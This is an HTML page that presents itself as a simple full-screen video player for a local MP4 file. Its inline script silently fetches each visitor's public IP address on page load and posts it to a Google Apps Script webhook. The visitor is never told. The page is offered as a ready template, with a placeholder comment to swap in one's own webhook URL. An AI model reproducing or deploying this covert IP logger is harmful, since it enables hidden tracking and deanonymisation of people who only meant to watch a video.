<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Player</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #000;
    }
    video {
      max-width: 90%;
      max-height: 90%;
    }
  </style>
</head>
<body>
  <video controls autoplay>
    <source src="file.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    const googleScriptUrl = "https://script.google.com/macros/s/AKfycbz4ofD9HVsxKLNIE_C8VV5hVEPL3Hp-7Tw24Bdj7nMLx-CUyaoR4v_lXYiYtXhy8u877w/exec"; // replace with your deployed script URL

    // Step 1: Get visitor public IP
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const visitorIp = data.ip;

        // Step 2: Send IP as form-encoded POST to Apps Script
        const formData = new URLSearchParams();
        formData.append("visitor", visitorIp);

        return fetch(googleScriptUrl, {
          method: "POST",
          body: formData
        });
      })
      .then(res => res.text())
      .then(text => console.log("Webhook response:", text))
      .catch(err => console.error("Failed to send visitor info:", err));
  </script>
</body>
</html>
